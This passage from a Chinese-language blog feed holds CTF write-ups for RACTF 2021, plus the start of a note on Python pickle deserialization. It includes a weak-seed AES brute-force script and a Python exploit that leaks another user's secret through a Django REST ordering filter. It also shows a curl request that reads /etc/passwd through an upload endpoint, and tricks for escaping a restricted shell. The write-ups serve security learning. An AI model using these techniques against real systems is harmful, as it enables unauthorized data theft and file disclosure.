&lt;span style="color:#d88200">&amp;#34;crypto/aes&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;crypto/cipher&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;encoding/hex&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span style="color:#d88200">&amp;#34;strings&amp;#34;&lt;/span>
&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">hextext&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#d88200">&amp;#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914&amp;#34;&lt;/span> &lt;span style="color:#75715e">// Encrypted Flag
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">:=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">&amp;lt;=&lt;/span>&lt;span style="color:#ae81ff">19777868&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int64&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">seed&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Seed&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Int63&lt;/span>&lt;span style="color:#111">())&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">key&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span> &lt;span style="color:#111">&amp;lt;&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">BlockSize&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#75af00">i&lt;/span>&lt;span style="color:#f92672">++&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">iv&lt;/span> &lt;span style="color:#111">=&lt;/span> &lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">byte&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Intn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">255&lt;/span>&lt;span style="color:#111">)))&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">aes&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCipher&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">key&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">cipher&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">NewCBCDecrypter&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">block&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">iv&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">_&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">hex&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">DecodeString&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">hextext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flagBytes&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75af00">mode&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">CryptBlocks&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">ciphertext&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75af00">flag&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">string&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flagBytes&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#75af00">strings&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Contains&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">fmt&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Flag: %s\n&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ractf{int3rEst1ng_M4sk_paTt3rn}&lt;/code>&lt;/p>
&lt;p>参考：&lt;a href="https://ctf.rip/write-ups/crypto/ractf-2021-military-grade/">wp&lt;/a>&lt;/p>
&lt;h2 id="websecret-store">Web/Secret Store&lt;/h2>
&lt;blockquote>
&lt;p>How many secrets could a secret store store if a store could store secrets?&lt;/p>
&lt;/blockquote>
&lt;p>注册和登录之后可以通过api设置一个自己的secret，设置好之后还可以更改&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818040636796.png" alt="image-20210818040636796">&lt;/p>
&lt;p>给出了源码，是django框架，用到了rest_framework，页面的debug模式还开着，有一个名为secret的app&lt;/p>
&lt;p>models.py规定了数据库的存储&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133525714.png" alt="image-20210818133525714">&lt;/p>
&lt;p>还有个配套的model serializer，规定了只读和只写的不同内容&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133658766.png" alt="image-20210818133658766">&lt;/p>
&lt;p>然后是views.py，当确认user登录状态之后，如果设置过secret将会展示出来&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818134115205.png" alt="image-20210818134115205">&lt;/p>
&lt;p>直接用Get方式请求&lt;code>/api/secret/?format=json&lt;/code>可以得到所有设置过的secret，理所当然的猜测id=1,owner=1的value=flag，但是value字段是只写而非只读的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818151539994.png" alt="image-20210818151539994">&lt;/p>
&lt;p>由于用的是django的rest framework，可以利用它的&lt;a href="https://www.django-rest-framework.org/api-guide/filtering/#orderingfilter">Ordering Filter&lt;/a>功能来对这些json内容根据value来进行一个排序&lt;code>/api/secret/?ordering=value&amp;amp;format=json&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818152408227.png" alt="image-20210818152408227">&lt;/p>
&lt;p>采用char-by-char的盲注方式，不断地重复设置secret-&amp;gt;以value排序-&amp;gt;如果位于id=1,owner=1的前面，并且下一次就位于它的后面，说明这是正确的字符-&amp;gt;修改secret，继续爆破下一个字符&lt;/p>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">json&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;ractf&amp;#34;&lt;/span>
&lt;span style="color:#111">csrf_token&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;XI7ZT6jdFeTvlywSDvRQT2xFlIAF2BRIF7ndzDOZqWPwZsIRdkbmgFSIpV8m9NIu&amp;#34;&lt;/span>
&lt;span style="color:#111">session_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;hkdm1dclym6oycoe8pcmyvlh5d87qfvq&amp;#34;&lt;/span>
&lt;span style="color:#111">headers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;Cookie&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#34;csrftoken=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">csrf_token&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">; sessionid=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">session_id&lt;/span>&lt;span style="color:#d88200">}&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;X-CSRFToken&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">csrf_token&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">our_secret_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">update_secret&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curr_flag&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">found_real_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">False&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">range&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">127&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">curr_flag&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">json_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">post&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:21627/api/secret/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">json_payload&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># print(r.status_code)&lt;/span>
&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;http://193.57.159.27:21627/api/secret/?ordering=value&amp;amp;format=json&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">headers&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secrets&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">json&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">secret&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">secrets&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">found_real_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">our_secret_id&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">found_real_char&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">break&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">next_char&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">update_secret&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">next_char&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;[+] Curr Flag:&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;code>ractf{data_exf1l_via_s0rt1ng_0c66de47}&lt;/code>&lt;/p>
&lt;p>参考：&lt;a href="https://github.com/glikogataki/RACTF-Some-Challs/tree/main/secret_store">wp1&lt;/a> &lt;a href="https://medium.com/@Nicholaz99/ractf-2021-writeup-647554511dc5">wp2&lt;/a>&lt;/p>
&lt;h2 id="webim-a-fun">Web/I&amp;rsquo;m a fun&lt;/h2>
&lt;blockquote>
&lt;p>Agent,&lt;/p>
&lt;p>Do you remember the firearms store case from last year? The one they were using as a secret communication platform?&lt;/p>
&lt;p>Well, we&amp;rsquo;ve located the servers for them, the issue is they&amp;rsquo;re based abroad in a country where we do not have any jurisdiction. Thus, we&amp;rsquo;ll need to gain shell access to their systems the good old way. They&amp;rsquo;re hosting another webapp again, this time it seems like some early version of a social media network that they&amp;rsquo;re working on. This is good for us as it means there will almost certainly be some vulnerabilities present.&lt;/p>
&lt;p>We&amp;rsquo;ve linked the webapp for you, can you take a look and see if you can gain access to their server?&lt;/p>
&lt;/blockquote>
&lt;p>在/upload/content处可以上传video，特别的是上传处有个&lt;code>external&lt;/code>&lt;/p>
&lt;p>用curl方式请求一下/etc/passwd，&lt;code>curl -X POST http://193.57.159.27:26635/upload/content -F file=/etc/passwd -F source=internal&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818163712187.png" alt="image-20210818163712187">&lt;/p>
&lt;p>之后尝试读源码（我没爆出来目录），之后的看wp了，我太菜&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818170117432.png" alt="image-20210818170117432">&lt;/p>
&lt;p>&lt;code>ractf{l4ws_0f_phys1cs_c4n_tak3_a_h1ke}&lt;/code>&lt;/p>
&lt;p>参考：&lt;a href="https://github.com/TheBadGod/ractf2021/blob/main/im_a_fan.md">wp&lt;/a>&lt;/p>
&lt;h2 id="osinttriangles">OSINT/Triangles&lt;/h2>
&lt;p>&lt;a href="https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW">https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815120938702.png" alt="image-20210815120938702">&lt;/p>
&lt;h2 id="miscellaneousdiscord">Miscellaneous/Discord&lt;/h2>
&lt;blockquote>
&lt;p>Come join our &lt;a href="https://discord.gg/Rrhdvzn">Discord&lt;/a>!&lt;/p>
&lt;/blockquote>
&lt;p>&lt;code>ractf{so_here_we_are_again}&lt;/code>&lt;/p>
&lt;h2 id="miscellaneousmissing-tools">Miscellaneous/Missing Tools&lt;/h2>
&lt;blockquote>
&lt;p>Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?&lt;/p>
&lt;p>Username: &lt;code>ractf&lt;/code>&lt;/p>
&lt;p>Password: &lt;code>8POlNixzDSThy&lt;/code>&lt;/p>
&lt;p>Note: it may take a minute or more for your container to start depending on load&lt;/p>
&lt;/blockquote>
&lt;p>根据给出的信息ssh连入一个终端，可以发现很多的命令都被禁止了&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025059013.png" alt="image-20210818025059013">&lt;/p>
&lt;p>使用&lt;code>echo /usr/bin/* /bin/*&lt;/code>可以查看能使用的命令还有哪些&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025158619.png" alt="image-20210818025158619">&lt;/p>
&lt;p>————先说一下简单的非预期解：&lt;code>echo *&lt;/code>找到flag.txt，然后&lt;code>source flag.txt&lt;/code>或者&lt;code>sh &amp;lt; flag.txt&lt;/code>都能读出来&lt;/p>
&lt;p>而预期解使用的是&lt;u>split+re-sha256&lt;/u>的方式。直接用sha256sum得到flag然后想强行暴力破解显然非常的不现实，但是split这个工具可以以固定的字节数来划分给定的文件，如果我们以很小的标尺来划分flag并进行sha256，那么这样得到的hash值就将非常有可能爆破出来，最后再把它们合起来就能得到最终的flag了（这里用3bytes划分）&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ split -b &lt;span style="color:#ae81ff">3&lt;/span> flag.txt
$ &lt;span style="color:#111">echo&lt;/span> *
flag.txt xaa xab xac xad xae xaf xag xah xai xaj xak xal
$ sha256sum xa*
df10b4bd068175bd33f200e48e721a019091c67c06c26ae273da5aaf51424618 xaa
582c3f2f5c5c630d0ee458d5d7c859e7ed36d6fb5862a761e110562438bd4272 xab
a7f5397443359ea76c50be82c77f1f893a060925b51a332cc5da906f83d3344e xac
569a659ae7633e5ddd7f523b283c1169dad3eb99a3da4b3ad2d5619d9236dc12 xad
7096489b19f4ab1b6c9e1502367c18d5e3adcfeb21b0a0282041ca99e798a14d xae
618630d1fed7f03ed43dfb03eeae681c1812177c43d3afe1cbe32bb3fee12bf9 xaf
f2f9ca19dad6782e5e92edd758439f11067ae23ab0d418a56f406de6c9bb151a xag
f481b98f744da847f44f5e67996010859061dca4945e87396016a1ef4ac38460 xah
de7bc3aee118c9689e2cba40c4c427ab8986b8a37c9c4f837e019559de9faffd xai
a14d511b5d8b444da7ea5ab52feb71271a46bb8374ab24f5251701b23bef4276 xaj
56fb98daea7879c3e2218eb960b9150c2d7978686af5f7f43f80641a6f62b22a xak
df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246 xal
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030044169.png" alt="image-20210818030044169">&lt;/p>
&lt;p>到&lt;a href="https://crackstation.net/">CrackStation&lt;/a>一把梭&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030225147.png" alt="image-20210818030225147">&lt;/p>
&lt;p>&lt;code>ractf{std0ut_1s_0v3rr4ted_spl1t_sha}&lt;/code>&lt;/p>
&lt;hr>
&lt;p>害，前几天状态莫名很差，之前报的几个周末的ctf甚至连签到都没签，复现也是一拖再拖，拖到环境都关完了，挺后悔的，是自己的问题。&lt;/p>
&lt;p>在反思和调整了，嗯。&lt;/p></description></item><item><title>反序列化专题笔记·壹·python篇</title><link>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</link><pubDate>Thu, 12 Aug 2021 11:48:05 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/12/python-unserialize-notes-01-python/</guid><description>&lt;h2 id="序列化反序列化">序列化&amp;amp;反序列化&lt;/h2>
&lt;p>在python中有好几个内置模块都可以干序列化&amp;amp;反序列化这个事，比如&lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label2">json&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label3">pickle&lt;/a>/&lt;a href="https://docs.python.org/2/library/pickle.html#module-cPickle">cpickle&lt;/a>, &lt;a href="https://www.cnblogs.com/gcgc/p/10973418.html#_label4">shelve&lt;/a>, &lt;a href="https://docs.python.org/zh-cn/3/library/marshal.html">marshal&lt;/a>，而本文后面涉及到的序列化和反序列化操作若无特殊说明，指的都是pickle。&lt;/p>
&lt;p>pickle后的对象以二进制字节流存储，能表示python几乎所有的类型（包括自定义类型），比如&lt;/p>
&lt;ul>
&lt;li>&lt;code>None&lt;/code> 、 &lt;code>True&lt;/code> 和 &lt;code>False&lt;/code>&lt;/li>
&lt;li>整数、浮点数、复数&lt;/li>
&lt;li>str、byte、bytearray&lt;/li>
&lt;li>只包含可封存对象的集合，包括 tuple、list、set 和 dict&lt;/li>
&lt;li>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）&lt;/li>
&lt;li>定义在模块最外层的内置函数&lt;/li>
&lt;li>定义在模块最外层的类&lt;/li>
&lt;li>&lt;code>__dict__&lt;/code> 属性值或 &lt;code>__getstate__()&lt;/code> 函数的返回值可以被序列化的类（详见官方文档的Pickling Class Instances）&lt;/li>
&lt;/ul>
&lt;p>当然也有例外，比如文件对象和网络套接字对象以及代码对象就不可以。&lt;/p>
&lt;p>对于一个Object，可以通过重写&lt;code>object.__reduce__()&lt;/code>函数，使其被序列化时按照重写的方式进行；此函数会返回一个&lt;code>(callable, ([para1, para2, ...])[, ...])&lt;/code>的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。&lt;/p>
&lt;p>pickle的常用方法有dumps(), loads()和dump(), load()，不带s的需要的参数是文件句柄，而带s的所需要的参数是字符串。&lt;/p>
&lt;p>说到pickle不得不谈的是opcode，即&lt;u>PVM(python virtual machine)&lt;/u>的操作码，它可以被PVM的解析引擎解释处理。目前opcode有多不同的实现版本（但向下兼容），其中py2和py3序列化的结果是不同的，可以在调用函数时指定协议版本。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
